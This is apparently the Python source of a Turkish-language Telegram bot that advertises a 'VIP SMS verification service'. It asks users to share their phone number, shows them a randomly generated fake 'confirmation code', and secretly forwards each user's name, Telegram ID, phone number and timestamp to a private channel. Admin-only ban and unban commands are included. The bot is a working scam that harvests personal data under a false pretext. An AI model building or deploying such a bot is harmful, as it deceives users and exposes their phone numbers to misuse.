import os
import random
import json
from datetime import datetime
from zoneinfo import ZoneInfo
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters

TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
KANAL_ID = int(os.getenv("KANAL_ID"))

waiting_number = set()

if os.path.exists("banned.json"):
    with open("banned.json", "r") as f:
        banned_users = set(json.load(f))
else:
    banned_users = set()

def save_bans():
    with open("banned.json", "w") as f:
        json.dump(list(banned_users), f)

def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 SMS İşlemi Başlat", callback_data="sms")],
        [InlineKeyboardButton("👑 Hesabım & Bilgilerim", callback_data="profil")],
        [InlineKeyboardButton("🛠 Destek Merkezi", callback_data="yardim")]
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id in banned_users:
        return

    text = f"""
╔══════════════════════╗
🌟  WELCOME TO VIP SMS SYSTEM  🌟
╚══════════════════════╝

👤 Kullanıcı: {user.first_name}
🆔 ID: {user.id}

━━━━━━━━━━━━━━━━━━━━━━
💎 Premium SMS Onay Hizmeti
⚡ Yüksek Hızlı Sistem
🔒 Güvenli & Otomatik İşlem
━━━━━━━━━━━━━━━━━━━━━━

⬇️ Devam etmek için bir işlem seç
"""

    await update.message.reply_text(text, reply_markup=main_menu())

async def menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user
    if user.id in banned_users:
        return
    await query.answer()

    if query.data == "sms":
        waiting_number.add(user.id)
        btn = KeyboardButton("📲 Numara Gönder", request_contact=True)
        kb = ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)
        await query.message.reply_text("📞 Telefon numaranı paylaşarak işleme devam et", reply_markup=kb)

    elif query.data == "profil":
        await query.message.reply_text(
            f"""
👑 HESAP BİLGİLERİN

🆔 ID: {user.id}
👤 Ad: {user.first_name}

💎 VIP Kullanıcı
"""
        )

    elif query.data == "yardim":
        await query.message.reply_text(
            """
🛠 DESTEK MERKEZİ

1️⃣ SMS İşlemi Başlat butonuna bas
2️⃣ Numaranı gönder
3️⃣ Onay kodunu anında al

Sorun yaşarsan admin ile iletişime geç.
"""
        )

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id in banned_users:
        return
    if user.id not in waiting_number:
        return

    waiting_number.remove(user.id)

    phone = update.message.contact.phone_number
    code = random.randint(100000, 999999)
    time = datetime.now(ZoneInfo("Europe/Istanbul")).strftime("%d.%m.%Y %H:%M:%S")

    await update.message.reply_text(f"✅ Onay Kodun: {code}")

    text = f"""
🚨 Yeni SMS Onay

👤 Kullanıcı: {user.first_name}
🆔 ID: {user.id}
📞 Numara: {phone}
🔢 Kod: {code}
🕒 Saat: {time}
"""

    await context.bot.send_message(chat_id=KANAL_ID, text=text)

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if not context.args:
        await update.message.reply_text("Kullanım: /ban kullanıcı_id")
        return
    try:
        uid = int(context.args[0])
        banned_users.add(uid)
        save_bans()
        await update.message.reply_text("✅ Kullanıcı banlandı")
    except:
        await update.message.reply_text("❌ Geçersiz ID")

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if not context.args:
        await update.message.reply_text("Kullanım: /unban kullanıcı_id")
        return
    try:
        uid = int(context.args[0])
        banned_users.discard(uid)
        save_bans()
        await update.message.reply_text("✅ Ban kaldırıldı")
    except:
        await update.message.reply_text("❌ Geçersiz ID")

app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("ban", ban))
app.add_handler(CommandHandler("unban", unban))
app.add_handler(CallbackQueryHandler(menu_buttons))
app.add_handler(MessageHandler(filters.CONTACT, contact_handler))

app.run_polling()
